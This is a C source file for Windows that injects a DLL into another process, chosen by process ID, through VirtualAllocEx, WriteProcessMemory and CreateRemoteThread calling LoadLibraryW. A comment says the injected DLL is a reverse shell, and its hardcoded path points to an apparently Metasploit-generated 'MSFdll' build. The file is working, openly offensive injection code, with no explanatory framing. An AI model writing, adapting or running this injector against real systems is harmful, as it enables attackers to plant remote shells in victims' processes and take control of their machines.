#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

int main(int argc, char* argv[]) {
    HANDLE hProcess, hThread = NULL;
    DWORD PID, TID = NULL;
    LPVOID rbuffer = NULL;
    HMODULE hKernel32 = NULL;

    // Change this to the path of your reverse shell DLL
    wchar_t dllpath[MAX_PATH] = L"C:\\Users\\Soliman Store\\source\\repos\\MSFdll\\x64\\Debug\\MSFdll.dll";
    size_t dllPathSize = sizeof(dllpath);

    if (argc < 2) {
        printf("%s Usage Example : %s <PID>\n", e, argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    // Step 1: Get a handle to the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        printf("%s Couldn't get a handle to the process %ld, error: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Got a handle to the process %ld\n", k, PID);

    // Step 2: Allocate memory in the target process for the DLL path
    rbuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (rbuffer == NULL) {
        printf("%s Couldn't allocate memory, error: %ld\n", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s Allocated memory in the process\n", k);

    // Step 3: Write the DLL path into the target process memory
    if (!WriteProcessMemory(hProcess, rbuffer, dllpath, dllPathSize, NULL)) {
        printf("%s Failed to write to process memory, error: %ld\n", e, GetLastError());
        VirtualFreeEx(hProcess, rbuffer, 0, MEM_RELEASE); // Clean up memory
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s Wrote [%S] to process memory\n", k, dllpath);

    // Step 4: Get the address of LoadLibraryW in Kernel32.dll
    hKernel32 = GetModuleHandleW(L"Kernel32");
    if (hKernel32 == NULL) {
        printf("%s Couldn't get a handle to Kernel32.dll, error: %ld\n", e, GetLastError());
        VirtualFreeEx(hProcess, rbuffer, 0, MEM_RELEASE); // Clean up memory
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s Got a handle to Kernel32.dll\n", k);

    LPTHREAD_START_ROUTINE start = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (start == NULL) {
        printf("%s Couldn't get the address of LoadLibraryW, error: %ld\n", e, GetLastError());
        VirtualFreeEx(hProcess, rbuffer, 0, MEM_RELEASE); // Clean up memory
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s Got the address of LoadLibraryW() function\n", k);

    // Step 5: Create a remote thread in the target process to load the DLL
    hThread = CreateRemoteThread(hProcess, NULL, 0, start, rbuffer, 0, &TID);
    if (hThread == NULL) {
        printf("%s Couldn't create a remote thread, error: %ld\n", e, GetLastError());
        VirtualFreeEx(hProcess, rbuffer, 0, MEM_RELEASE); // Clean up memory
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s Created remote thread in the process: %ld\n", k, TID);

    // Step 6: Wait for the thread to finish executing
    printf("%s Waiting for the thread to finish\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s Thread finished executing\n", k);

    // Step 7: Clean up
    printf("%s Cleaning up...\n", i);
    VirtualFreeEx(hProcess, rbuffer, 0, MEM_RELEASE); // Free allocated memory
    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("Done!!!\n");
    return EXIT_SUCCESS;
}
